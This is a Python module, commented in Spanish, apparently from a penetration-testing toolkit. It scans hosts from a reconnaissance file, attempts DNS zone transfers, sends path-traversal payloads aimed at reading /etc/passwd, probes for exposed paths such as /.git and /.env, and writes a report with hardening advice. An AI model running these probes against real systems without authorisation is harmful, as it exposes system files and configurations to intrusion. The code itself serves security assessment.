#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Módulo 5: Service Exploitation
Explota servicios específicos detectados en la red
"""

import json
import os
import time
import socket
import requests
import subprocess
from datetime import datetime
from typing import Dict, List
from pathlib import Path

class ServiceExploit:
    """Clase para explotar servicios específicos"""
    
    def __init__(self, recon_file: str = "reports/informe_reconocimiento.json", output_dir: str = "reports"):
        """
        Inicializa el módulo de explotación de servicios
        
        Args:
            recon_file: Archivo de reconocimiento
            output_dir: Directorio para informes
        """
        self.recon_file = recon_file
        self.output_dir = output_dir
        
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        
        self.report = {
            "module": "Service Exploitation",
            "timestamp": datetime.now().isoformat(),
            "start_time": datetime.now().isoformat(),
            "end_time": None,
            "duration_seconds": 0,
            "status": "IN_PROGRESS",
            "services_analyzed": [],
            "vulnerabilities_found": [],
            "exploits_successful": [],
            "statistics": {
                "total_services": 0,
                "vulnerable_services": 0,
                "successful_exploits": 0
            },
            "recommendations": []
        }
    
    def _save_report(self):
        """Guarda el informe"""
        try:
            output_file = os.path.join(self.output_dir, "informe_service_exploitation.json")
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(self.report, f, indent=4, ensure_ascii=False)
        except Exception as e:
            print(f"[!] Error guardando informe: {e}")
    
    def run_exploitation(self) -> Dict:
        """Ejecuta la explotación de servicios"""
        print(f"\n{'='*70}")
        print(f"  MÓDULO 5: SERVICE EXPLOITATION")
        print(f"{'='*70}\n")
        
        start_time = time.time()
        
        try:
            # Cargar reconocimiento
            hosts = self._load_reconnaissance()
            
            if not hosts:
                print(f"[!] No se pudieron cargar datos de reconocimiento")
                self.report['status'] = 'FAILED'
                return self.report
            
            print(f"[*] Analizando servicios en {len(hosts)} hosts...\n")
            
            # Analizar cada host
            for host in hosts:
                self._analyze_host_services(host)
            
            # Estado final
            if self.report['statistics']['successful_exploits'] > 0:
                self.report['status'] = 'SUCCESS'
                print(f"\n[✓] Explotación exitosa")
            elif self.report['statistics']['vulnerable_services'] > 0:
                self.report['status'] = 'PARTIAL'
                print(f"\n[!] Vulnerabilidades encontradas")
            else:
                self.report['status'] = 'COMPLETED'
                print(f"\n[*] Análisis completado")
        
        except Exception as e:
            print(f"\n[!] Error: {e}")
            self.report['status'] = 'ERROR'
            import traceback
            traceback.print_exc()
        
        finally:
            end_time = time.time()
            self.report['end_time'] = datetime.now().isoformat()
            self.report['duration_seconds'] = round(end_time - start_time, 2)
            
            self._add_recommendations()
            self._save_report()
            
            print(f"\n{'='*70}")
            print(f"  RESUMEN")
            print(f"{'='*70}")
            print(f"Servicios analizados: {self.report['statistics']['total_services']}")
            print(f"Vulnerabilidades: {self.report['statistics']['vulnerable_services']}")
            print(f"Exploits exitosos: {self.report['statistics']['successful_exploits']}")
            print(f"Duración: {self.report['duration_seconds']} segundos")
            print(f"Informe: {self.output_dir}/informe_service_exploitation.json")
            print(f"{'='*70}\n")
        
        return self.report
    
    def _load_reconnaissance(self) -> List[Dict]:
        """Carga datos del reconocimiento"""
        try:
            with open(self.recon_file, 'r') as f:
                data = json.load(f)
                return data.get('discovered_hosts', [])
        except:
            # Intentar archivos alternativos
            for filename in ['reconocimiento.json', 'scaneo.txt']:
                try:
                    with open(filename, 'r') as f:
                        data = json.load(f)
                        hosts = data.get('discovered_hosts', [])
                        if hosts:
                            return hosts
                except:
                    continue
        return []
    
    def _analyze_host_services(self, host: Dict):
        """Analiza servicios de un host"""
        ip = host['ip']
        ports = host.get('ports', [])
        
        if not ports:
            return
        
        print(f"[*] Analizando {ip}...")
        
        for port_info in ports:
            port = port_info.get('port')
            service = port_info.get('service', '').lower()
            product = port_info.get('product', '').lower()
            
            self.report['statistics']['total_services'] += 1
            
            # Analizar servicios específicos
            if port == 53:
                self._exploit_dns(ip, port)
            elif 'http' in service or port in [80, 443, 8080]:
                self._exploit_http(ip, port, product, port_info)
            elif port in [49152, 62078]:
                self._exploit_high_port(ip, port)
            elif port == 6646:
                self._exploit_port_6646(ip, port)
    
    def _exploit_dns(self, ip: str, port: int):
        """Explota servicio DNS"""
        print(f"    [*] Analizando DNS en puerto {port}...")
        
        # Intentar zone transfer
        try:
            result = subprocess.run(
                ['dig', f'@{ip}', 'axfr'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if 'Transfer failed' not in result.stdout and len(result.stdout) > 100:
                print(f"    [✓✓✓] Zone Transfer exitoso!")
                
                self.report['vulnerabilities_found'].append({
                    "host": ip,
                    "service": "DNS",
                    "port": port,
                    "type": "DNS Zone Transfer",
                    "severity": "MEDIUM",
                    "details": "El servidor DNS permite zone transfers sin autenticación"
                })
                
                self.report['statistics']['vulnerable_services'] += 1
        except:
            pass
        
        # Banner anómalo detectado
        self.report['vulnerabilities_found'].append({
            "host": ip,
            "service": "DNS",
            "port": port,
            "type": "Suspicious Banner",
            "severity": "LOW",
            "details": "Banner inusual: 'None of your business' - posible honeypot o configuración custom"
        })
    
    def _exploit_http(self, ip: str, port: int, product: str, port_info: Dict):
        """Explota servicios HTTP/HTTPS"""
        print(f"    [*] Analizando HTTP en puerto {port}...")
        
        protocol = 'https' if port == 443 else 'http'
        base_url = f"{protocol}://{ip}:{port}"
        
        try:
            # Verificar servidor
            response = requests.get(base_url, timeout=5, verify=False)
            server = response.headers.get('Server', '')
            
            # Lighttpd específico
            if 'lighttpd' in product or 'lighttpd' in server.lower():
                print(f"        [*] lighttpd detectado")
                
                self.report['vulnerabilities_found'].append({
                    "host": ip,
                    "service": "HTTP",
                    "port": port,
                    "type": "Outdated Web Server",
                    "severity": "MEDIUM",
                    "details": f"lighttpd detectado - verificar versión para CVEs conocidos",
                    "product": product
                })
                
                self.report['statistics']['vulnerable_services'] += 1
                
                # Intentar directory traversal
                self._test_directory_traversal(base_url, ip, port)
            
            # Verificar directorios sensibles
            self._check_sensitive_directories(base_url, ip, port)
        
        except Exception as e:
            print(f"        [!] Error analizando HTTP: {e}")
    
    def _test_directory_traversal(self, base_url: str, ip: str, port: int):
        """Prueba directory traversal"""
        traversal_payloads = [
            '/../../../etc/passwd',
            '/..%2f..%2f..%2fetc/passwd',
            '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        ]
        
        for payload in traversal_payloads:
            try:
                response = requests.get(base_url + payload, timeout=3, verify=False)
                
                if response.status_code == 200 and 'root:' in response.text:
                    print(f"        [✓✓✓] Directory Traversal vulnerable!")
                    
                    self.report['vulnerabilities_found'].append({
                        "host": ip,
                        "service": "HTTP",
                        "port": port,
                        "type": "Directory Traversal",
                        "severity": "CRITICAL",
                        "details": f"Directory traversal exitoso con payload: {payload}",
                        "payload": payload
                    })
                    
                    self.report['exploits_successful'].append({
                        "host": ip,
                        "service": "HTTP",
                        "exploit": "Directory Traversal",
                        "result": "/etc/passwd readable"
                    })
                    
                    self.report['statistics']['successful_exploits'] += 1
                    return
            except:
                pass
    
    def _check_sensitive_directories(self, base_url: str, ip: str, port: int):
        """Verifica directorios sensibles"""
        sensitive_paths = [
            '/admin', '/administrator', '/config', '/backup',
            '/cgi-bin', '/.git', '/.env', '/phpinfo.php'
        ]
        
        for path in sensitive_paths:
            try:
                response = requests.get(base_url + path, timeout=2, verify=False)
                
                if response.status_code == 200:
                    print(f"        [!] Directorio accesible: {path}")
                    
                    self.report['vulnerabilities_found'].append({
                        "host": ip,
                        "service": "HTTP",
                        "port": port,
                        "type": "Sensitive Directory Accessible",
                        "severity": "MEDIUM",
                        "details": f"Directorio sensible accesible: {path}"
                    })
            except:
                pass
    
    def _exploit_high_port(self, ip: str, port: int):
        """Analiza puertos dinámicos (tcpwrapped)"""
        print(f"    [*] Analizando puerto alto {port} (tcpwrapped)...")
        
        # Intentar identificar el servicio real
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            
            # Enviar datos y ver respuesta
            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
            response = sock.recv(1024)
            sock.close()
            
            if response:
                print(f"        [*] Respuesta recibida - posible servicio HTTP")
                
                self.report['vulnerabilities_found'].append({
                    "host": ip,
                    "service": "Unknown",
                    "port": port,
                    "type": "Unidentified Service",
                    "severity": "LOW",
                    "details": f"Servicio tcpwrapped en puerto {port} - posible AirPlay/iTunes o servicio custom"
                })
        except:
            pass
    
    def _exploit_port_6646(self, ip: str, port: int):
        """Analiza puerto 6646"""
        print(f"    [*] Analizando puerto 6646...")
        
        self.report['vulnerabilities_found'].append({
            "host": ip,
            "service": "Unknown",
            "port": port,
            "type": "Unidentified Service",
            "severity": "LOW",
            "details": "Puerto 6646 tcpwrapped - requiere análisis adicional"
        })
    
    def _add_recommendations(self):
        """Agrega recomendaciones"""
        recommendations = [
            "Actualizar todos los servicios web a sus últimas versiones",
            "Deshabilitar directory listing en servidores web",
            "Implementar rate limiting y WAF",
            "Cerrar puertos innecesarios y servicios no utilizados",
            "Configurar DNS para no permitir zone transfers desde cualquier IP",
            "Implementar autenticación fuerte en todos los servicios",
            "Realizar pentesting regular de servicios expuestos",
            "Monitorear logs de acceso a servicios críticos",
            "Implementar IDS/IPS para detectar intentos de explotación",
            "Seguir principio de menor privilegio en configuración de servicios"
        ]
        
        self.report['recommendations'] = recommendations

